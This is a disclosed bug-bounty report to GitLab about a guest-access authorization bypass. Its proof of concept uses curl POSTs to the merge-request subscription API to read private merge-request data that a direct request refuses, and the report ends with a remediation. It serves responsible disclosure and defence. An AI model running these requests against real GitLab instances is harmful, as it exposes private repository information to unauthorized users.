# User with guest access can access private merge requests

## Report Details
- **Report ID**: 195134
- **URL**: https://hackerone.com/reports/195134
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-01T20:13:06.240Z
- **Disclosed**: 2017-01-23T23:09:46.885Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
# Vulnerability details
A guest user to a private group, cannot access a project's merge requests. However, through the subscription API, an attacker can (un)subscribe itself to a merge request, revealing private information that shouldn't be accessible.

# Impact
Merge request might contain private information that the repository owner does not want to reveal to guest access users. 

# Proof of concept
1. As a group / project owner, invite someone with guest access
2. As the same user, create a merge request - this MR is not accessible by users with guest access
3. Accept the invitation as a new user and create an API token for your account
4. Now send a `POST` request to the subscription API with a reference to the MR:

**Request**
```
curl -X POST -H "Private-Token: XXXX" http://gitlab-instance/api/v3/projects/1/merge_requests/1/subscription
```

**Response**
```json
{
  "id": 2,
  "iid": 2,
  "project_id": 1,
  "title": "<title>",
  "description": "<description>",
  "state": "opened",
  "created_at": "2017-01-01T19:55:03.121Z",
  "updated_at": "2017-01-01T19:55:03.121Z",
  "target_branch": "master",
  "source_branch": "dev",
  "upvotes": 0,
  "downvotes": 0,
  "author": {
    "name": "XXX",
    "username": "XXX",
    "id": 1,
    "state": "active",
    "avatar_url": "...",
    "web_url": "..."
  },
  "assignee": null,
  "source_project_id": 2,
  "target_project_id": 2,
  "labels": [
    
  ],
  "work_in_progress": false,
  "milestone": null,
  "merge_when_build_succeeds": false,
  "merge_status": "can_be_merged",
  "sha": "c60a6c2312c184942b19c1828abb3d65e66c01c7",
  "merge_commit_sha": null,
  "subscribed": true,
  "user_notes_count": 0,
  "approvals_before_merge": null,
  "should_remove_source_branch": null,
  "force_remove_source_branch": false,
  "web_url": "..."
}
```

You'll notice that when requesting the MR directly, the server will return a 403.

**Request**
```
curl -X GET -H "Private-Token: XXXX" http://gitlab-instance/api/v3/projects/1/merge_requests/2
```

**Response**
```json
{"message":"403 Forbidden"}
```

# Remediation
Use the appropriate finder in the `lib/api/subscriptions.rb` on line 6 and 7 instead of calling `find` directly on the `merge_requests` relationship. This will scope the available merge requests to the ones that the user can subscribe to.

## Attachments
No attachments
